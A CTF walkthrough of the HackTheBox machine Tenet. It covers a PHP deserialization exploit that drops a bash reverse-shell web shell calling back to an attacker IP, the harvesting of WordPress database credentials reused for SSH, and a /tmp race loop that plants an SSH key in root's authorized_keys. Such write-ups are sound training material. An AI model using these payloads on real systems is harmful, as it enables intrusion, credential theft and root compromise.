---
title: "Walk-through of Tenet from HackTheBox"
header:
  teaser: /assets/images/2021-05-21-16-07-48.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - WordPress
  - Serialise
---

## Machine Information

![tenet](/assets/images/2021-05-21-16-07-48.png)

Tenet is rated as a medium machine on HackTheBox. Our initial scan finds a WordPress site with a suspicious post that leads us to a method to achieve remote code execution. We use this to gain an initial shell, and from there we find ssh credentials. Escalating to root requires us to take advantage of a bash script that puts our own rsa key in to known hosts on the box.

<!--more-->

Skills required are basic port enumeration and OS exploration knowledge. Skills learned are serialise and deserialisation techniques used to develop exploits.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Medium - Tenet](https://www.hackthebox.eu/home/machines/profile/309) |
| Machine Release Date | 16th Jan 2021 |
| Date I Completed It | 11th June 2021 |
| Distribution Used | Kali 2021.1 – [Release Info](https://www.kali.org/blog/kali-linux-2021-1-release) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/tenet]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.223 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/htb/tenet]
└─# nmap -p$ports -sC -sV -oA tenet 10.10.10.223
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-20 15:51 BST
Nmap scan report for 10.10.10.223
Host is up (0.028s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.25 seconds
```

Just two open ports, let's look at port 80 first:

![tenet-default](/assets/images/2021-05-20-15-56-06.png)

An Apache default install page, let's add the IP to our hosts file and see if the server is using [virtual hosts](https://httpd.apache.org/docs/2.4/vhosts/examples.html):

```text
┌──(root💀kali)-[~/htb/tenet]
└─# echo 10.10.10.223 tenet.htb >> /etc/hosts
```

## WordPress

Now let's browse to the name instead of the IP:

![tenet-blog](/assets/images/2021-05-20-15-57-48.png)

It's a WordPress site. Looking around there are a few articles, but nothing very interesting. At the bottom it shows us there is a user neil who has made a comment:

![tenet-recent-comment](/assets/images/2021-05-20-15-58-23.png)

Let's see what he had to say:

![tenet-neil-comment](/assets/images/2021-05-20-15-58-42.png)

Hmm. A clue, but I don't know what sator is. Let's try adding that as a subdomain:

```text
┌──(root💀kali)-[~/htb/tenet]
└─# sed -i '/10.10.10.223 tenet.htb/ s/$/ sator.tenet.htb/' /etc/hosts
```

And now browse to it, to see if there is another virtual host:

![tenet-sator](/assets/images/2021-05-20-16-03-04.png)

There is, but it's another default page. Going back to the comment he mentions a php file, which I eventually find:

![tenet-sator-php](/assets/images/2021-05-20-16-02-13.png)

After more looking around, I reread the comment and realise he mentions a backup. Using Curl I find he's made a backup of the sator.php file:

```text
┌──(root💀kali)-[~/htb/tenet]
└─# wget http://sator.tenet.htb/sator.php.bak                                                                              
--2021-05-20 16:03:55--  http://sator.tenet.htb/sator.php.bak
Resolving sator.tenet.htb (sator.tenet.htb)... 10.10.10.223
Connecting to sator.tenet.htb (sator.tenet.htb)|10.10.10.223|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 514 [application/x-trash]
Saving to: ‘sator.php.bak’
sator.php.bak      100%[==============================>]     514  --.-KB/s    in 0s      
2021-05-20 16:03:55 (69.9 MB/s) - ‘sator.php.bak’ saved [514/514]
```

Let's have a look at the contents:

```text
┌──(root💀kali)-[~/htb/tenet]
└─# more sator.php.bak       
<?php
class DatabaseExport
{
        public $user_file = 'users.txt';
        public $data = '';
        public function update_db()
        {
                echo '[+] Grabbing users from text file <br>';
                $this-> data = 'Success';
        }
        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
                echo '[] Database updated <br>';
        //      echo 'Gotta get this working properly...';
        }
}
$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);
$app = new DatabaseExport;
$app -> update_db();
?>
```

We can see there is a GET statement which uses the input variable **arepo**, where it deserialises what is passed to it. This is then written to the file defined in the variable **user_file**.

First let's test to see if we can get the users.txt file:

```text
┌──(root💀kali)-[~/htb/tenet]
└─# wget http://sator.tenet.htb/users.txt    
--2021-05-20 16:05:17--  http://sator.tenet.htb/users.txt
Resolving sator.tenet.htb (sator.tenet.htb)... 10.10.10.223
Connecting to sator.tenet.htb (sator.tenet.htb)|10.10.10.223|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7 [text/plain]
Saving to: ‘users.txt’
users.txt        100%[===========================>]       7  --.-KB/s    in 0s      
2021-05-20 16:05:17 (1.76 MB/s) - ‘users.txt’ saved [7/7]
                                                                                                       
┌──(root💀kali)-[~/htb/tenet]
└─# cat users.txt 
Success          
```

We can and it shows the contents is what was in the php file.

## Reverse Shell

We can abuse this to get remote code execution by writing a php reverse shell, and then using the serialize function to encode it. Then when we pass to sator.php it will deserialize it and write the file to disk on the server.

Let's start php in interactive mode so we can write our code:

```text
┌──(root💀kali)-[~/htb/tenet]
└─# php -a           
Interactive mode enabled
php >
```

Now we create our own class the same as in the sator.php file but with a reverse shell in it:

```text
php > class DatabaseExport {
php {   public $user_file = 'pencer_shell.php';
php {   public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.10.14.40/1337 0>&1\'"); ?>';
php {   }
php >
```

Next we need to serialize it:

```
php > print urlencode(serialize(new DatabaseExport));
O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A16%3A%22pencer_shell.php%22%3Bs%3A4%3A%22data%22%3Bs%3A73%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.10.14.40%2F1337+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
```

We can now use that encoded string as the input for the variable **arepo** we saw in the source code:

```text
┌──(root💀kali)-[~/htb/tenet]
└─# curl -i http://sator.tenet.htb/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A16%3A%22pencer_shell.php%22%3Bs%3A4%3A%22data%22%3Bs%3A73%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.10.14.40%2F1337+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
HTTP/1.1 200 OK
Date: Thu, 20 May 2021 16:08:48 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 87
Content-Type: text/html; charset=UTF-8
[+] Grabbing users from text file <br>
[] Database updated <br>[] Database updated <br>
```

Finally we can use Curl to get the shell we dropped:

```text
┌──(root💀kali)-[~/htb/tenet]
└─# curl http://sator.tenet.htb/pencer_shell.php
```

Switch to a waiting netcat listener and we are connected:

```text
──(root💀kali)-[~/htb/tenet]
└─# nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.14.40] from (UNKNOWN) [10.10.10.223] 15500
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
pwd
/var/www/html
```

Ok, so we are connected as the web user. Let's upgrade to a better shell:

```text
which python3
/usr/bin/python3
/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@tenet:/var/www/html$ ^Z
zsh: suspended  nc -nlvp 1337
┌──(root💀kali)-[~/htb/tenet]
└─# stty raw -echo; fg
[1]  + continued  nc -nlvp 1337
www-data@tenet:/var/www/html$ stty rows 61 cols 237
www-data@tenet:/var/www/html$ export TERM=xterm
```

Much more usable. Let's see what we have:

```text
www-data@tenet:/var/www/html$ ls -lsa
total 44
 4 drwxr-xr-x 3 www-data www-data  4096 May 20 15:17 .
 4 drwxr-xr-x 3 root     root      4096 Dec 16 11:26 ..
12 -rw-r--r-- 1 www-data www-data 10918 Dec 16 11:19 index.html
 4 -rw-r--r-- 1 www-data www-data    73 May 20 15:17 pencer_shell.php
 4 -rwxr-xr-x 1 www-data www-data   514 Dec 17 09:40 sator.php
 4 -rwxr-xr-x 1 www-data www-data   514 Dec 17 09:52 sator.php.bak
 4 -rw-r--r-- 1 www-data www-data     7 May 20 15:17 users.txt
 4 drwxr-xr-x 5 www-data www-data  4096 May 20 12:17 wordpress
```

We see the wordpress installation folder, let's look in the config file:

```text
www-data@tenet:/var/www/html$ cat wordpress/wp-config.php | grep -B 5 -A 5 pass
define( 'DB_NAME', 'wordpress' );
/** MySQL database username */
define( 'DB_USER', 'neil' );
/** MySQL database password */
define( 'DB_PASSWORD', '<HIDDEN>' );
/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

## User Flag

We've got neil's password for the database. I wonder if he's reused the same one for ssh access:

```text
┌──(root💀kali)-[~/htb/tenet]
└─# ssh neil@tenet.htb       
The authenticity of host 'tenet.htb (10.10.10.223)' can't be established.
ECDSA key fingerprint is SHA256:WV3NcHaV7asDFwcTNcPZvBLb3MG6RbhW9hWBQqIDwlE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'tenet.htb,10.10.10.223' (ECDSA) to the list of known hosts.
neil@tenet.htb's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
  System information as of Thu May 20 15:28:38 UTC 2021
  System load:  0.22               Processes:             293
  Usage of /:   16.9% of 22.51GB   Users logged in:       2
  Memory usage: 34%                IP address for ens160: 10.10.10.223
  Swap usage:   0%
Last login: Thu May 20 14:33:28 2021 from 10.10.14.246
neil@tenet:~$ 
```

He did! What can we see here:

```text
neil@tenet:~$ ls -lsa
total 40
4 drwxr-xr-x 6 neil neil 4096 May 20 14:07 .
4 drwxr-xr-x 3 root root 4096 Dec 17 09:33 ..
0 lrwxrwxrwx 1 neil neil    9 Dec 17 10:53 .bash_history -> /dev/null
4 -rw-r--r-- 1 neil neil  220 Dec 16 15:00 .bash_logout
4 -rw-r--r-- 1 neil neil 3771 Dec 16 15:00 .bashrc
4 drwx------ 2 neil neil 4096 Dec 17 10:51 .cache
4 drwxr-x--- 3 neil neil 4096 May 20 14:07 .config
4 drwx------ 4 neil neil 4096 May 20 14:08 .gnupg
4 drwxrwxr-x 3 neil neil 4096 Dec 17 10:52 .local
4 -rw-r--r-- 1 neil neil  807 Dec 16 15:00 .profile
4 -r-------- 1 neil neil   33 May 20 05:05 user.txt
neil@tenet:~$
```

As expected the user flag is there, let's grab it:

```text
neil@tenet:~$ cat user.txt
<HIDDEN>
```

Before doing enumeration or using something like LinPEAS I usually look for SUID binaries and sudo permissions. Turned out sudo was the right path here:

```text
neil@tenet:~$ sudo -l
Matching Defaults entries for neil on tenet:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:

User neil may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
neil@tenet:~$ 
```

Neil can run a suspicious sounding file as root. Let's check it out:

```text
neil@tenet:~$ cat /usr/local/bin/enableSSH.sh 
#!/bin/bash
checkAdded() {
        sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)
        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then
                /bin/echo "Successfully added $sshName to authorized_keys file!"
        else
                /bin/echo "Error in adding $sshName to authorized_keys file!"
        fi
}

checkFile() {
        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then
                /bin/echo "Error in creating key file!"
                if [[ -f $1 ]]; then /bin/rm $1; fi
                exit 1
        fi
}

addKey() {
        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
        (umask 110; touch $tmpName)
        /bin/echo $key >>$tmpName
        checkFile $tmpName
        /bin/cat $tmpName >>/root/.ssh/authorized_keys
        /bin/rm $tmpName
}

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
addKey
checkAdded
```

This looks like the intended path. The script is writing the root users rsa key to a file in /tmp with a random name starting with "ssh-". It then copies that to root authorized_keys file, which allows you to login via ssh as root with the matching private key. After that it deletes the randomly named file.

## Privilege Escalation

Let's generate a new rsa key on Kali:

```text
┌──(root💀kali)-[~/htb/tenet]
└─# ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /root/htb/tenet/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/htb/tenet/id_rsa
Your public key has been saved in /root/htb/tenet/id_rsa.pub
The key fingerprint is:
SHA256:lt2cQkMPM0ZxuOH/ZiYHzNTwH9tgsYPmtfFHX9+aWtU root@kali
The key's randomart image is:
+---[RSA 3072]----+
|         .Oo.    |
|         oo*. .  |
|         .oo.= o |
|         +o++.X.+|
|        S oB+o OE|
|       .   .* .oO|
|             o.o.|
|            ..O  |
|            .B   |
+----[SHA256]-----+
```

Cat the key and copy to clipboard:

```text
┌──(root💀kali)-[~/htb/tenet]
└─# cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCm0sP8Ub54/DF6XVjCHc861aaqpXOPrmuuoVz/hB5bTF5KUITPeNFx+wumVpUOoMK9r/ZkaJpGnpji7TGm77xng0GtXW58PW/dK8Y2krKqjdJIBEVJHAzTTVu0M4b0tlS09udx5B3NibuVq/oPZJlgCbiaR/SlDOszQnB1ZLki/cFketLhNHeJjTpQZE/bWgtepRYR2aiKtTXOye9B8BolOxHKolkVoV/0rs0VuTgixz3CeOnWpENt+fBvY6ZX4jJWXcsdkebxigSobTpecS/ycOiSB9oqvihDOx3cv6HPg4rQIXVnLV3/tY9CUAKlWR7UXuZw7Jy217LGfJbE6FOPQR5erKU8COluEVV3601DkHpo1wLp84+gjadoubD9lyg1xtnVya5+Smrcm3m0cCDoRdnSHAQLw0w31XyxdZO4v8HVKrkTifSh9eN464HDZxrAgZNV38JIzA2NVO0Wn4cDfJOj5jWhZxDhPD8UjXryv/IPa5J8asA8CbCeVM9dgw0= root@kali
```

Now all we need to do is have two sessions open to the box both as neil. The first one we are going to use bash to create a loop, where it keeps writing our key to any file in /tmp/ssh. It will do this forever, so we can just leave it running:

```text
neil@tenet:~$ while true; do echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCm0sP8Ub54/DF6XVjCHc861aaqpXOPrmuuoVz/hB5bTF5KUITPeNFx+wumVpUOoMK9r/ZkaJpGnpji7TGm77xng0GtXW58PW/dK8Y2krKqjdJIBEVJHAzTTVu0M4b0tlS09udx5B3NibuVq/oPZJlgCbiaR/SlDOszQnB1ZLki/cFketLhNHeJjTpQZE/bWgtepRYR2aiKtTXOye9B8BolOxHKolkVoV/0rs0VuTgixz3CeOnWpENt+fBvY6ZX4jJWXcsdkebxigSobTpecS/ycOiSB9oqvihDOx3cv6HPg4rQIXVnLV3/tY9CUAKlWR7UXuZw7Jy217LGfJbE6FOPQR5erKU8COluEVV3601DkHpo1wLp84+gjadoubD9lyg1xtnVya5+Smrcm3m0cCDoRdnSHAQLw0w31XyxdZO4v8HVKrkTifSh9eN464HDZxrAgZNV38JIzA2NVO0Wn4cDfJOj5jWhZxDhPD8UjXryv/IPa5J8asA8CbCeVM9dgw0= root@kali" | tee /tmp/ssh* > /dev/null; done
```

So the loop is putting our key in to any file that exists in the tmp folder. In our second ssh session we have open as neil we just need to keep running the script as root:

```text
neil@tenet:~$ sudo /usr/local/bin/enableSSH.sh
Successfully added root@ubuntu to authorized_keys file!
neil@tenet:~$ 
```

You may need to do it several times to catch it just right, but when you do the public rsa key we generated on our Kali machine is copied in to the known hosts for root on the tenet box.

## Root Flag

Once that's happened we can log in as root using our private rsa key:

```text
┌──(root💀kali)-[~/htb/tenet]
└─# ssh root@tenet.htb -i id_rsa                                      
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
 System information disabled due to load higher than 2.0
Last login: Thu May 20 14:37:21 2021 from 10.10.14.246
root@tenet:~#
```

Now all that's left to do is grab the root flag:

```text
root@tenet:~# ls -la
total 44
drwx------  6 root root 4096 Feb 11 14:38 .
drwxr-xr-x 23 root root 4096 Jan  7 09:58 ..
lrwxrwxrwx  1 root root    9 Dec  9 12:35 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Dec  8 11:10 .cache
drwx------  3 root root 4096 Dec  8 11:10 .gnupg
-rw-------  1 root root   41 Jan  7 10:15 .lesshst
drwxr-xr-x  3 root root 4096 Dec  8 09:23 .local
-r--------  1 root root   33 May 20 05:05 root.txt
-rw-r--r--  1 root root   66 Dec  8 10:27 .selected_editor
drwx------  2 root root 4096 May 20 15:39 .ssh
-rw-------  1 root root 1929 Feb 11 14:38 .viminfo

root@tenet:~# cat root.txt 
<HIDDEN>
```
